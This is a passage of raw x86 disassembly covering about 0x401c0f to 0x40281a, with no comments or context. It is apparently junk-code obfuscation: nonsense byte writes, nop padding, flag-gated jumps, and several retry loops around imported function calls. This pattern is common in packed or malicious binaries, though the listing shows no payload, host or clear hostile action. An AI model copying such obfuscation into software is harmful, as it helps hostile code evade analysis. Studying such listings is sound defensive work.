  401c0f:	mov    BYTE PTR ds:0x40715a,0xcd
  401c16:	xor    eax,esi
  401c18:	mov    BYTE PTR ds:0x407070,0x9e
  401c1f:	mov    BYTE PTR ds:0x4070f7,0x7a
  401c26:	push   0x407241
  401c2b:	push   0xf
  401c2d:	push   0x407232
  401c32:	push   0x407226
  401c37:	push   0x407226
  401c3c:	call   DWORD PTR ds:0x405038
  401c42:	test   eax,eax
  401c44:	jne    0x401b82
  401c4a:	mov    BYTE PTR ds:0x40709a,0x9d
  401c51:	or     esi,0x20
  401c54:	mov    BYTE PTR ds:0x4071e5,0x38
  401c5b:	add    edx,eax
  401c5d:	mov    BYTE PTR ds:0x4070e2,0xa4
  401c64:	mov    ecx,DWORD PTR ds:0x4071aa
  401c6a:	add    edx,eax
  401c6c:	mov    BYTE PTR ds:0x407097,0x38
  401c73:	sub    edi,0x46
  401c76:	mov    edi,DWORD PTR ds:0x407042
  401c7c:	adc    BYTE PTR ds:0x4071aa,bl
  401c82:	adc    esi,ebx
  401c84:	add    eax,esi
  401c86:	mov    edi,DWORD PTR ds:0x407148
  401c8c:	and    DWORD PTR ds:0x407090,esi
  401c92:	adc    BYTE PTR ds:0x4070ff,al
  401c98:	sub    DWORD PTR ds:0x4070cb,ebx
  401c9e:	add    ecx,0xffffffdd
  401ca1:	cmp    BYTE PTR ds:0x407208,0x1
  401ca8:	jb     0x401212
  401cae:	nop
  401caf:	add    esi,0xfffffff5
  401cb2:	add    edi,edi
  401cb4:	xor    DWORD PTR ds:0x4071a6,esi
  401cba:	add    esi,eax
  401cbc:	mov    BYTE PTR ds:0x40709b,0x8f
  401cc3:	mov    BYTE PTR ds:0x407152,0xc8
  401cca:	add    ecx,0x74
  401ccd:	sbb    esi,ebx
  401ccf:	mov    BYTE PTR ds:0x4071b7,0x76
  401cd6:	mov    BYTE PTR ds:0x407059,0x3
  401cdd:	xor    DWORD PTR ds:0x407113,ebx
  401ce3:	or     esi,0x6
  401ce6:	adc    ecx,0xffffff93
  401ce9:	sbb    ebx,ebx
  401ceb:	mov    BYTE PTR ds:0x407144,0x60
  401cf2:	or     DWORD PTR ds:0x40715e,eax
  401cf8:	add    edx,0x10
  401cfb:	sbb    DWORD PTR ds:0x4071e3,eax
  401d01:	mov    BYTE PTR ds:0x40701c,0x91
  401d08:	push   0x407241
  401d0d:	push   0xf
  401d0f:	push   0x407232
  401d14:	push   0x407226
  401d19:	push   0x407226
  401d1e:	call   DWORD PTR ds:0x405038
  401d24:	cmp    eax,0x0
  401d27:	jne    0x401caf
  401d29:	mov    BYTE PTR ds:0x40705a,0x96
  401d30:	add    edx,0xffffffc0
  401d33:	add    DWORD PTR ds:0x4070fe,edx
  401d39:	mov    bh,BYTE PTR ds:0x407017
  401d3f:	and    DWORD PTR ds:0x4070b1,eax
  401d45:	or     DWORD PTR ds:0x40711a,edx
  401d4b:	add    esi,ebx
  401d4d:	mov    eax,ds:0x40701e
  401d52:	mov    BYTE PTR ds:0x40718f,0x82
  401d59:	mov    BYTE PTR ds:0x407052,0xd8
  401d60:	add    edx,ebx
  401d62:	sbb    edx,0x5
  401d65:	mov    BYTE PTR ds:0x40711e,0x26
  401d6c:	sub    eax,0xffffffd2
  401d6f:	xor    DWORD PTR ds:0x40712c,edx
  401d75:	sub    edx,0xffffff8d
  401d78:	mov    BYTE PTR ds:0x4070e6,0x81
  401d7f:	push   0x407241
  401d84:	push   0xf
  401d86:	push   0x407232
  401d8b:	push   0x407226
  401d90:	push   0x407226
  401d95:	call   DWORD PTR ds:0x405038
  401d9b:	test   eax,eax
  401d9d:	jne    0x401caf
  401da3:	add    ch,0xa7
  401da6:	xor    DWORD PTR ds:0x407167,esi
  401dac:	mov    eax,ds:0x407083
  401db1:	and    DWORD PTR ds:0x40719f,ecx
  401db7:	add    esi,ecx
  401db9:	and    DWORD PTR ds:0x4071bb,esi
  401dbf:	and    eax,0x40
  401dc2:	mov    BYTE PTR ds:0x4071c2,0x5
  401dc9:	sbb    eax,0x58
  401dcc:	sub    DWORD PTR ds:0x4070ef,edi
  401dd2:	sub    ebx,ebx
  401dd4:	add    edx,ebx
  401dd6:	xor    ebx,eax
  401dd8:	add    ebx,0x66
  401ddb:	sbb    esi,0xffffffae
  401dde:	sbb    ebx,0xffffffe1
  401de1:	adc    edx,ecx
  401de3:	mov    eax,ds:0x40714c
  401de8:	cmp    BYTE PTR ds:0x407208,0x1
  401def:	jb     0x403f89
  401df5:	nop
  401df6:	nop
  401df7:	nop
  401df8:	nop
  401df9:	nop
  401dfa:	nop
  401dfb:	nop
  401dfc:	nop
  401dfd:	nop
  401dfe:	nop
  401dff:	nop
  401e00:	mov    edi,DWORD PTR ds:0x4070da
  401e06:	mov    ebx,DWORD PTR ds:0x40705b
  401e0c:	mov    bh,BYTE PTR ds:0x407053
  401e12:	or     DWORD PTR ds:0x4070ec,ebx
  401e18:	xor    DWORD PTR ds:0x40718f,esi
  401e1e:	mov    ah,BYTE PTR ds:0x407049
  401e24:	xor    esi,ebx
  401e26:	mov    BYTE PTR ds:0x4071f0,0x33
  401e2d:	mov    ecx,DWORD PTR ds:0x4070a4
  401e33:	mov    ds:0x4070d9,eax
  401e38:	xor    DWORD PTR ds:0x4070d2,eax
  401e3e:	add    edx,ebx
  401e40:	add    ecx,ebx
  401e42:	mov    esi,DWORD PTR ds:0x407022
  401e48:	sbb    eax,0x5d
  401e4b:	mov    eax,ds:0x4070a1
  401e50:	add    edi,eax
  401e52:	sbb    BYTE PTR ds:0x4070fc,bl
  401e58:	add    edx,0x58
  401e5b:	push   0x407259
  401e60:	call   DWORD PTR ds:0x405000
  401e66:	add    ecx,esi
  401e68:	mov    BYTE PTR ds:0x407062,0xd8
  401e6f:	sbb    esi,0xffffffe9
  401e72:	add    dh,cl
  401e74:	mov    BYTE PTR ds:0x4071d6,0xdc
  401e7b:	mov    BYTE PTR ds:0x407015,0x7c
  401e82:	or     DWORD PTR ds:0x4071a7,esi
  401e88:	mov    BYTE PTR ds:0x4070b9,0xfe
  401e8f:	or     DWORD PTR ds:0x40703a,eax
  401e95:	add    dl,0x90
  401e98:	mov    BYTE PTR ds:0x407016,0xa6
  401e9f:	mov    BYTE PTR ds:0x40711a,0xeb
  401ea6:	or     ebx,0x26
  401ea9:	or     DWORD PTR ds:0x4070aa,edi
  401eaf:	mov    BYTE PTR ds:0x407030,0x60
  401eb6:	cmp    BYTE PTR ds:0x407208,0x1
  401ebd:	jb     0x40237c
  401ec3:	nop
  401ec4:	nop
  401ec5:	nop
  401ec6:	nop
  401ec7:	sub    DWORD PTR ds:0x4070d5,eax
  401ecd:	sbb    BYTE PTR ds:0x4071dd,bh
  401ed3:	add    edx,ebx
  401ed5:	or     edx,0x6a
  401ed8:	mov    esi,DWORD PTR ds:0x4070ce
  401ede:	mov    BYTE PTR ds:0x407137,0x42
  401ee5:	or     DWORD PTR ds:0x4070c6,ebx
  401eeb:	xor    DWORD PTR ds:0x40711d,eax
  401ef1:	adc    edx,eax
  401ef3:	xor    edi,0xffffffdf
  401ef6:	add    edi,0xffffff80
  401ef9:	add    edx,edx
  401efb:	adc    eax,eax
  401efd:	mov    BYTE PTR ds:0x407030,0x55
  401f04:	mov    bh,BYTE PTR ds:0x4070a9
  401f0a:	mov    BYTE PTR ds:0x407196,0x78
  401f11:	sbb    edi,edx
  401f13:	push   0x407250
  401f18:	call   DWORD PTR ds:0x405014
  401f1e:	test   eax,eax
  401f20:	jne    0x401ec7
  401f22:	add    DWORD PTR ds:0x407078,esi
  401f28:	mov    ecx,DWORD PTR ds:0x4070c8
  401f2e:	mov    bl,BYTE PTR ds:0x407090
  401f34:	and    esi,0xd
  401f37:	mov    ecx,DWORD PTR ds:0x407116
  401f3d:	or     edi,0xffffffe2
  401f40:	adc    DWORD PTR ds:0x4070c4,ebx
  401f46:	add    ecx,0xffffff88
  401f49:	mov    esi,DWORD PTR ds:0x407092
  401f4f:	and    eax,0x54
  401f52:	adc    ebx,0xffffff8c
  401f55:	sbb    esi,ebx
  401f57:	or     DWORD PTR ds:0x4071c0,ecx
  401f5d:	add    DWORD PTR ds:0x407195,edi
  401f63:	add    edi,0xffffffaa
  401f66:	mov    BYTE PTR ds:0x407021,0x84
  401f6d:	add    edx,ecx
  401f6f:	sub    DWORD PTR ds:0x407178,esi
  401f75:	cmp    BYTE PTR ds:0x407208,0x1
  401f7c:	jb     0x40352d
  401f82:	nop
  401f83:	nop
  401f84:	nop
  401f85:	nop
  401f86:	nop
  401f87:	nop
  401f88:	nop
  401f89:	nop
  401f8a:	nop
  401f8b:	nop
  401f8c:	nop
  401f8d:	nop
  401f8e:	nop
  401f8f:	nop
  401f90:	nop
  401f91:	nop
  401f92:	sub    esi,0x6
  401f95:	add    ah,bl
  401f97:	mov    BYTE PTR ds:0x407088,0x29
  401f9e:	mov    BYTE PTR ds:0x4071a6,0x69
  401fa5:	mov    esi,DWORD PTR ds:0x4071df
  401fab:	mov    esi,DWORD PTR ds:0x407082
  401fb1:	mov    edi,DWORD PTR ds:0x4070ad
  401fb7:	adc    esi,eax
  401fb9:	adc    edi,edi
  401fbb:	mov    bh,BYTE PTR ds:0x407140
  401fc1:	mov    BYTE PTR ds:0x407043,0x74
  401fc8:	add    esi,edi
  401fca:	mov    BYTE PTR ds:0x4070c3,0xcf
  401fd1:	add    eax,edi
  401fd3:	adc    ebx,0xffffffbe
  401fd6:	push   0x407259
  401fdb:	call   DWORD PTR ds:0x405000
  401fe1:	mov    BYTE PTR ds:0x407026,0x85
  401fe8:	sub    esi,0x63
  401feb:	mov    DWORD PTR ds:0x40708c,ebx
  401ff1:	mov    BYTE PTR ds:0x407025,0x62
  401ff8:	xor    ebx,0xffffff85
  401ffb:	adc    esi,0xfffffff4
  401ffe:	add    edx,0xffffffec
  402001:	sub    eax,ebx
  402003:	mov    ecx,DWORD PTR ds:0x4070ca
  402009:	mov    BYTE PTR ds:0x4071bd,0x89
  402010:	and    DWORD PTR ds:0x40708d,eax
  402016:	mov    ebx,DWORD PTR ds:0x4071d7
  40201c:	add    ebx,0x1d
  40201f:	mov    edi,DWORD PTR ds:0x407102
  402025:	mov    ebx,DWORD PTR ds:0x40707a
  40202b:	push   0x407241
  402030:	push   0xf
  402032:	push   0x407232
  402037:	push   0x407226
  40203c:	push   0x407226
  402041:	call   DWORD PTR ds:0x405038
  402047:	cmp    eax,0x0
  40204a:	jne    0x401ec7
  402050:	mov    edx,DWORD PTR ds:0x40711f
  402056:	or     DWORD PTR ds:0x4070a7,ebx
  40205c:	add    ecx,ebx
  40205e:	sbb    eax,0xffffffe1
  402061:	add    edx,ebx
  402063:	mov    BYTE PTR ds:0x40701b,0x1e
  40206a:	mov    bl,BYTE PTR ds:0x4070b2
  402070:	add    edx,edi
  402072:	xor    DWORD PTR ds:0x40714d,eax
  402078:	or     esi,0x3f
  40207b:	and    ebx,0xffffff86
  40207e:	sbb    esi,0xffffff9a
  402081:	sbb    edi,ecx
  402083:	mov    edi,DWORD PTR ds:0x4070f9
  402089:	add    edx,0x66
  40208c:	or     edx,0x7d
  40208f:	or     eax,0x59
  402092:	and    edx,0x33
  402095:	cmp    BYTE PTR ds:0x407208,0x1
  40209c:	jb     0x404299
  4020a2:	nop
  4020a3:	mov    DWORD PTR ds:0x4071e1,edi
  4020a9:	add    ebx,0xfffffffb
  4020ac:	add    dh,al
  4020ae:	mov    eax,ds:0x40702e
  4020b3:	add    ecx,0xffffffd4
  4020b6:	add    edx,ebx
  4020b8:	xor    ecx,0xffffffa8
  4020bb:	mov    DWORD PTR ds:0x407060,ecx
  4020c1:	add    DWORD PTR ds:0x4070e0,eax
  4020c7:	mov    dh,BYTE PTR ds:0x4071c1
  4020cd:	mov    BYTE PTR ds:0x4071f3,0x24
  4020d4:	sub    edx,0xffffffeb
  4020d7:	xor    esi,esi
  4020d9:	mov    ecx,DWORD PTR ds:0x4070ae
  4020df:	sub    ebx,edi
  4020e1:	sub    esi,edi
  4020e3:	sub    DWORD PTR ds:0x4071ba,edx
  4020e9:	push   0x407241
  4020ee:	push   0xf
  4020f0:	push   0x407232
  4020f5:	push   0x407226
  4020fa:	push   0x407226
  4020ff:	call   DWORD PTR ds:0x405038
  402105:	test   eax,eax
  402107:	jne    0x4020a3
  402109:	mov    BYTE PTR ds:0x4071cc,0x82
  402110:	mov    ds:0x407054,eax
  402115:	mov    BYTE PTR ds:0x40718e,0x6d
  40211c:	mov    ebx,DWORD PTR ds:0x407017
  402122:	add    edx,esi
  402124:	add    ecx,0xffffffb2
  402127:	mov    BYTE PTR ds:0x4070b3,0x33
  40212e:	mov    BYTE PTR ds:0x4070c1,0x2d
  402135:	mov    BYTE PTR ds:0x407008,0x5
  40213c:	mov    ebx,DWORD PTR ds:0x4071e0
  402142:	mov    BYTE PTR ds:0x407108,0x1
  402149:	mov    dh,BYTE PTR ds:0x4071a3
  40214f:	or     DWORD PTR ds:0x4071f2,eax
  402155:	add    ecx,ecx
  402157:	adc    esi,0x57
  40215a:	and    DWORD PTR ds:0x407064,edi
  402160:	cmp    BYTE PTR ds:0x407208,0x1
  402167:	jb     0x401212
  40216d:	nop
  40216e:	nop
  40216f:	nop
  402170:	nop
  402171:	nop
  402172:	nop
  402173:	nop
  402174:	nop
  402175:	nop
  402176:	nop
  402177:	nop
  402178:	nop
  402179:	nop
  40217a:	nop
  40217b:	nop
  40217c:	mov    edi,DWORD PTR ds:0x407083
  402182:	mov    BYTE PTR ds:0x4070cb,0xb9
  402189:	add    esi,edi
  40218b:	mov    ebx,DWORD PTR ds:0x407108
  402191:	add    eax,esi
  402193:	mov    BYTE PTR ds:0x40700c,0xe2
  40219a:	sub    edi,ebx
  40219c:	mov    BYTE PTR ds:0x407184,0x4a
  4021a3:	add    edx,eax
  4021a5:	adc    DWORD PTR ds:0x4071c2,edi
  4021ab:	add    ecx,eax
  4021ad:	add    esi,eax
  4021af:	adc    ecx,edi
  4021b1:	mov    BYTE PTR ds:0x407076,0xfb
  4021b8:	sbb    esi,eax
  4021ba:	push   0x407250
  4021bf:	call   DWORD PTR ds:0x405014
  4021c5:	test   eax,eax
  4021c7:	jne    0x40217c
  4021c9:	mov    al,ds:0x40703e
  4021ce:	mov    edi,DWORD PTR ds:0x4071af
  4021d4:	sub    al,0x97
  4021d6:	mov    BYTE PTR ds:0x40711b,0xb1
  4021dd:	mov    edi,DWORD PTR ds:0x4071fb
  4021e3:	and    DWORD PTR ds:0x407012,edi
  4021e9:	or     DWORD PTR ds:0x407082,eax
  4021ef:	or     edi,0xffffffe8
  4021f2:	adc    eax,edi
  4021f4:	mov    BYTE PTR ds:0x4071e8,0x7f
  4021fb:	add    edx,ebx
  4021fd:	mov    BYTE PTR ds:0x4071c8,0x2
  402204:	mov    BYTE PTR ds:0x4070fe,0xd0
  40220b:	mov    BYTE PTR ds:0x4070b1,0xe4
  402212:	add    dl,0x7b
  402215:	mov    BYTE PTR ds:0x40700c,0x70
  40221c:	push   0x407259
  402221:	call   DWORD PTR ds:0x405000
  402227:	mov    BYTE PTR ds:0x40714f,0x7a
  40222e:	sub    ebx,0xb
  402231:	add    edi,ebx
  402233:	adc    BYTE PTR ds:0x40718c,al
  402239:	mov    BYTE PTR ds:0x4071d3,0x4b
  402240:	xor    DWORD PTR ds:0x407178,eax
  402246:	and    DWORD PTR ds:0x407047,eax
  40224c:	mov    BYTE PTR ds:0x4070d2,0x84
  402253:	mov    BYTE PTR ds:0x40708e,0x10
  40225a:	or     DWORD PTR ds:0x4070bb,ebx
  402260:	xor    DWORD PTR ds:0x4070ee,eax
  402266:	sbb    ebx,esi
  402268:	adc    DWORD PTR ds:0x4071fa,edi
  40226e:	add    edx,0xffffffea
  402271:	sbb    DWORD PTR ds:0x407133,ebx
  402277:	mov    BYTE PTR ds:0x40717f,0xe8
  40227e:	and    eax,0xfffffffd
  402281:	sub    ebx,eax
  402283:	cmp    BYTE PTR ds:0x407208,0x1
  40228a:	jb     0x401b82
  402290:	nop
  402291:	nop
  402292:	nop
  402293:	nop
  402294:	nop
  402295:	nop
  402296:	nop
  402297:	nop
  402298:	nop
  402299:	and    DWORD PTR ds:0x4070e5,eax
  40229f:	mov    esi,DWORD PTR ds:0x40711e
  4022a5:	mov    edx,DWORD PTR ds:0x4071e8
  4022ab:	xor    DWORD PTR ds:0x4071d1,edi
  4022b1:	sub    ebx,0xffffffd5
  4022b4:	xor    edi,ebx
  4022b6:	add    edi,eax
  4022b8:	and    BYTE PTR ds:0x40701f,bl
  4022be:	add    ch,bl
  4022c0:	mov    edx,DWORD PTR ds:0x407001
  4022c6:	mov    edi,DWORD PTR ds:0x407008
  4022cc:	adc    DWORD PTR ds:0x4070b3,eax
  4022d2:	adc    esi,0x60
  4022d5:	add    dh,ch
  4022d7:	mov    BYTE PTR ds:0x4071ad,0x51
  4022de:	or     DWORD PTR ds:0x4070b6,eax
  4022e4:	mov    BYTE PTR ds:0x4070a9,0x7e
  4022eb:	sbb    esi,0xffffffea
  4022ee:	push   0x407250
  4022f3:	call   DWORD PTR ds:0x405014
  4022f9:	cmp    eax,0x0
  4022fc:	jne    0x402299
  4022fe:	mov    ebx,DWORD PTR ds:0x4071ed
  402304:	mov    bl,BYTE PTR ds:0x4070d5
  40230a:	adc    esi,0x15
  40230d:	mov    BYTE PTR ds:0x4070e1,0x87
  402314:	mov    BYTE PTR ds:0x4070ae,0xbe
  40231b:	sbb    eax,0xffffffc3
  40231e:	mov    ecx,DWORD PTR ds:0x407113
  402324:	mov    BYTE PTR ds:0x40711a,0x3c
  40232b:	mov    edi,DWORD PTR ds:0x4071d4
  402331:	mov    BYTE PTR ds:0x4071d3,0xc5
  402338:	and    DWORD PTR ds:0x4070ef,eax
  40233e:	mov    BYTE PTR ds:0x40715d,0x93
  402345:	mov    al,ds:0x4071c0
  40234a:	or     DWORD PTR ds:0x407160,ebx
  402350:	mov    edx,DWORD PTR ds:0x407175
  402356:	add    ecx,0xffffffcd
  402359:	xor    ecx,0xffffffe9
  40235c:	sub    DWORD PTR ds:0x407031,esi
  402362:	mov    ebx,DWORD PTR ds:0x40711b
  402368:	adc    esi,0xffffffd8
  40236b:	cmp    BYTE PTR ds:0x407208,0x1
  402372:	jb     0x4033ee
  402378:	nop
  402379:	nop
  40237a:	nop
  40237b:	nop
  40237c:	add    edx,eax
  40237e:	mov    ebx,DWORD PTR ds:0x4071cc
  402384:	xor    edi,0x69
  402387:	mov    eax,ds:0x4071a1
  40238c:	sub    BYTE PTR ds:0x407081,dl
  402392:	or     DWORD PTR ds:0x4071b4,ebx
  402398:	mov    edx,DWORD PTR ds:0x407132
  40239e:	sbb    DWORD PTR ds:0x40703e,esi
  4023a4:	add    edx,eax
  4023a6:	mov    BYTE PTR ds:0x407022,0x87
  4023ad:	add    edi,eax
  4023af:	adc    DWORD PTR ds:0x4071d1,ebx
  4023b5:	sbb    edx,edi
  4023b7:	or     edx,0xffffffbe
  4023ba:	mov    ebx,DWORD PTR ds:0x407041
  4023c0:	push   0x407241
  4023c5:	push   0xf
  4023c7:	push   0x407232
  4023cc:	push   0x407226
  4023d1:	push   0x407226
  4023d6:	call   DWORD PTR ds:0x405038
  4023dc:	test   eax,eax
  4023de:	jne    0x40237c
  4023e0:	mov    BYTE PTR ds:0x407006,0x24
  4023e7:	mov    BYTE PTR ds:0x40709d,0xe
  4023ee:	sub    ebx,0x4e
  4023f1:	sbb    edi,0xffffff99
  4023f4:	add    ecx,0x12
  4023f7:	adc    eax,esi
  4023f9:	add    edx,eax
  4023fb:	adc    esi,edi
  4023fd:	or     DWORD PTR ds:0x407049,ecx
  402403:	mov    BYTE PTR ds:0x4070f7,0xa1
  40240a:	add    DWORD PTR ds:0x407035,eax
  402410:	and    ebx,0xffffffbc
  402413:	mov    BYTE PTR ds:0x40702e,0xc6
  40241a:	and    DWORD PTR ds:0x4070ab,ebx
  402420:	sub    ecx,ebx
  402422:	cmp    BYTE PTR ds:0x407208,0x1
  402429:	jb     0x401000
  40242f:	nop
  402430:	nop
  402431:	nop
  402432:	nop
  402433:	nop
  402434:	nop
  402435:	nop
  402436:	nop
  402437:	mov    esi,DWORD PTR ds:0x40716f
  40243d:	mov    BYTE PTR ds:0x40701c,0x23
  402444:	add    eax,0xffffffa7
  402447:	add    eax,0xffffff80
  40244a:	mov    eax,ds:0x407091
  40244f:	mov    BYTE PTR ds:0x40712e,0x67
  402456:	add    edi,esi
  402458:	mov    al,ds:0x40718c
  40245d:	mov    BYTE PTR ds:0x407174,0x60
  402464:	add    DWORD PTR ds:0x407090,esi
  40246a:	mov    BYTE PTR ds:0x407177,0x96
  402471:	mov    esi,DWORD PTR ds:0x4071c3
  402477:	add    dh,0xe1
  40247a:	sbb    ebx,ebx
  40247c:	mov    BYTE PTR ds:0x407163,0xeb
  402483:	mov    BYTE PTR ds:0x40705b,0x9
  40248a:	mov    BYTE PTR ds:0x407100,0x7d
  402491:	xor    eax,edi
  402493:	push   0x407259
  402498:	call   DWORD PTR ds:0x405000
  40249e:	add    bh,al
  4024a0:	mov    BYTE PTR ds:0x40703d,0xe9
  4024a7:	add    edx,esi
  4024a9:	mov    dh,BYTE PTR ds:0x4070e5
  4024af:	xor    ebx,0xffffffc5
  4024b2:	xor    BYTE PTR ds:0x4070fc,ah
  4024b8:	or     edi,0x5
  4024bb:	mov    bh,BYTE PTR ds:0x4070e9
  4024c1:	mov    DWORD PTR ds:0x4070b7,edi
  4024c7:	mov    BYTE PTR ds:0x4071c2,0x7b
  4024ce:	mov    eax,ds:0x40701f
  4024d3:	sbb    dl,al
  4024d5:	adc    edx,ebx
  4024d7:	add    edx,0xffffffab
  4024da:	sbb    edi,0xffffffd1
  4024dd:	and    ebx,0xffffff92
  4024e0:	xor    DWORD PTR ds:0x40708a,esi
  4024e6:	add    ecx,ebx
  4024e8:	push   0x407259
  4024ed:	call   DWORD PTR ds:0x405000
  4024f3:	mov    edx,DWORD PTR ds:0x40700f
  4024f9:	mov    ecx,DWORD PTR ds:0x4071b4
  4024ff:	add    dl,bh
  402501:	mov    BYTE PTR ds:0x40710b,0xa6
  402508:	mov    eax,ds:0x4071d0
  40250d:	mov    BYTE PTR ds:0x4070a0,0x7d
  402514:	mov    BYTE PTR ds:0x407186,0xe2
  40251b:	mov    BYTE PTR ds:0x407075,0x84
  402522:	and    bh,0x7e
  402525:	sub    edi,esi
  402527:	xor    edi,esi
  402529:	mov    ds:0x4071ba,eax
  40252e:	add    edi,eax
  402530:	sbb    esi,eax
  402532:	sub    ebx,0x72
  402535:	sub    DWORD PTR ds:0x4070e3,edi
  40253b:	mov    edi,DWORD PTR ds:0x407142
  402541:	cmp    BYTE PTR ds:0x407208,0x1
  402548:	jb     0x40269d
  40254e:	nop
  40254f:	nop
  402550:	nop
  402551:	nop
  402552:	nop
  402553:	nop
  402554:	nop
  402555:	nop
  402556:	and    DWORD PTR ds:0x4070f6,ebx
  40255c:	add    ecx,0xffffffcb
  40255f:	mov    BYTE PTR ds:0x407085,0xfa
  402566:	adc    DWORD PTR ds:0x40717e,edi
  40256c:	mov    bh,BYTE PTR ds:0x407017
  402572:	mov    BYTE PTR ds:0x40705e,0x1d
  402579:	mov    BYTE PTR ds:0x4071e5,0xc1
  402580:	or     DWORD PTR ds:0x4071c4,esi
  402586:	mov    BYTE PTR ds:0x40718e,0x43
  40258d:	adc    DWORD PTR ds:0x407162,esi
  402593:	xor    ecx,0xffffffb3
  402596:	sbb    ecx,0x29
  402599:	mov    BYTE PTR ds:0x4071f5,0xdb
  4025a0:	xor    edi,ebx
  4025a2:	add    ebx,ecx
  4025a4:	add    edi,edi
  4025a6:	push   0x407241
  4025ab:	push   0xf
  4025ad:	push   0x407232
  4025b2:	push   0x407226
  4025b7:	push   0x407226
  4025bc:	call   DWORD PTR ds:0x405038
  4025c2:	test   eax,eax
  4025c4:	jne    0x402556
  4025c6:	xor    DWORD PTR ds:0x40717c,eax
  4025cc:	adc    esi,esi
  4025ce:	and    DWORD PTR ds:0x407008,esi
  4025d4:	mov    bl,BYTE PTR ds:0x4071e2
  4025da:	add    edx,0xffffffe0
  4025dd:	xor    BYTE PTR ds:0x4070a9,ah
  4025e3:	adc    DWORD PTR ds:0x407151,ebx
  4025e9:	add    DWORD PTR ds:0x40713c,edi
  4025ef:	mov    BYTE PTR ds:0x4070f9,0x13
  4025f6:	adc    ebx,ebx
  4025f8:	add    eax,0x27
  4025fb:	mov    BYTE PTR ds:0x407114,0xf8
  402602:	or     esi,0xffffff80
  402605:	or     esi,0x2a
  402608:	xor    DWORD PTR ds:0x407180,edi
  40260e:	mov    BYTE PTR ds:0x4070b0,0xd3
  402615:	mov    BYTE PTR ds:0x407141,0x7c
  40261c:	add    edi,0xffffffd3
  40261f:	push   0x407259
  402624:	call   DWORD PTR ds:0x405000
  40262a:	adc    eax,ebx
  40262c:	mov    edx,DWORD PTR ds:0x4070f8
  402632:	mov    edx,DWORD PTR ds:0x407025
  402638:	mov    edi,DWORD PTR ds:0x4070a5
  40263e:	add    edx,0xfffffff6
  402641:	mov    DWORD PTR ds:0x4070da,edi
  402647:	and    DWORD PTR ds:0x4070f2,ebx
  40264d:	and    DWORD PTR ds:0x4071c0,edi
  402653:	mov    BYTE PTR ds:0x40701a,0xd8
  40265a:	add    ecx,edx
  40265c:	add    DWORD PTR ds:0x4070fd,edx
  402662:	mov    edx,DWORD PTR ds:0x4070ff
  402668:	mov    ch,BYTE PTR ds:0x407154
  40266e:	xor    eax,ebx
  402670:	xor    DWORD PTR ds:0x40710e,edi
  402676:	mov    ebx,DWORD PTR ds:0x4070c3
  40267c:	sbb    eax,0xffffffe9
  40267f:	xor    edi,0xffffffa1
  402682:	cmp    BYTE PTR ds:0x407208,0x1
  402689:	jb     0x4020a3
  40268f:	nop
  402690:	nop
  402691:	nop
  402692:	nop
  402693:	nop
  402694:	nop
  402695:	nop
  402696:	nop
  402697:	nop
  402698:	nop
  402699:	nop
  40269a:	nop
  40269b:	nop
  40269c:	nop
  40269d:	mov    ebx,DWORD PTR ds:0x407043
  4026a3:	mov    BYTE PTR ds:0x407041,0xbc
  4026aa:	mov    al,ds:0x407053
  4026af:	mov    eax,ds:0x4071ee
  4026b4:	mov    BYTE PTR ds:0x4071ef,0x1a
  4026bb:	sub    DWORD PTR ds:0x40719f,edi
  4026c1:	add    eax,ebx
  4026c3:	add    edx,0xfffffff6
  4026c6:	mov    BYTE PTR ds:0x4070c3,0x37
  4026cd:	add    edi,edx
  4026cf:	mov    BYTE PTR ds:0x40711b,0x18
  4026d6:	mov    edi,DWORD PTR ds:0x407159
  4026dc:	adc    DWORD PTR ds:0x407087,eax
  4026e2:	add    edx,0x4f
  4026e5:	or     BYTE PTR ds:0x407163,al
  4026eb:	add    eax,0x1
  4026ee:	push   0x407250
  4026f3:	call   DWORD PTR ds:0x405014
  4026f9:	cmp    eax,0x0
  4026fc:	jne    0x40269d
  4026fe:	add    edi,0x40
  402701:	xor    esi,0x16
  402704:	mov    BYTE PTR ds:0x407123,0x8a
  40270b:	mov    BYTE PTR ds:0x40701d,0x47
  402712:	add    eax,0x60
  402715:	sub    eax,ebx
  402717:	sub    DWORD PTR ds:0x40704a,esi
  40271d:	mov    esi,DWORD PTR ds:0x407062
  402723:	mov    BYTE PTR ds:0x407038,0x78
  40272a:	adc    DWORD PTR ds:0x407141,edi
  402730:	add    edx,edi
  402732:	xor    eax,0xffffffed
  402735:	add    ch,0xad
  402738:	mov    cl,BYTE PTR ds:0x40713f
  40273e:	mov    eax,ds:0x40701a
  402743:	mov    esi,DWORD PTR ds:0x40718f
  402749:	mov    BYTE PTR ds:0x4071ef,0x1f
  402750:	sbb    edi,0x69
  402753:	push   0x407259
  402758:	call   DWORD PTR ds:0x405000
  40275e:	mov    eax,ds:0x4071e1
  402763:	mov    edx,DWORD PTR ds:0x407059
  402769:	sub    esi,eax
  40276b:	sub    bl,0x18
  40276e:	adc    eax,0x5
  402771:	sub    esi,0xffffffe8
  402774:	sub    ebx,edi
  402776:	xor    DWORD PTR ds:0x40700c,esi
  40277c:	add    ecx,0x28
  40277f:	adc    ebx,edi
  402781:	sub    DWORD PTR ds:0x407138,esi
  402787:	mov    BYTE PTR ds:0x407199,0x9a
  40278e:	mov    edx,DWORD PTR ds:0x4071a3
  402794:	add    edi,ecx
  402796:	mov    edx,DWORD PTR ds:0x4071a1
  40279c:	adc    ebx,ebx
  40279e:	add    ecx,0xfffffffb
  4027a1:	xor    DWORD PTR ds:0x4071f6,eax
  4027a7:	mov    bl,BYTE PTR ds:0x4070d6
  4027ad:	cmp    BYTE PTR ds:0x407208,0x1
  4027b4:	jb     0x401212
  4027ba:	nop
  4027bb:	nop
  4027bc:	sub    esi,edi
  4027be:	add    edx,edi
  4027c0:	mov    ebx,DWORD PTR ds:0x407116
  4027c6:	xor    esi,0x43
  4027c9:	mov    bl,BYTE PTR ds:0x4071d3
  4027cf:	mov    bl,BYTE PTR ds:0x407119
  4027d5:	add    esi,0x7b
  4027d8:	mov    edi,DWORD PTR ds:0x4070e3
  4027de:	sbb    DWORD PTR ds:0x407162,ebx
  4027e4:	mov    ecx,DWORD PTR ds:0x4071f0
  4027ea:	add    ecx,edi
  4027ec:	mov    esi,DWORD PTR ds:0x40707b
  4027f2:	adc    edi,0x7b
  4027f5:	xor    edi,0xffffffc6
  4027f8:	adc    esi,eax
  4027fa:	push   0x407250
  4027ff:	call   DWORD PTR ds:0x405014
  402805:	cmp    eax,0x0
  402808:	jne    0x4027bc
  40280a:	mov    BYTE PTR ds:0x40707e,0xf3
  402811:	mov    BYTE PTR ds:0x4071a3,0xc0
  402818:	sbb    edi,ebx
  40281a:	mov    BYTE PTR ds:0x4071a5,0x51
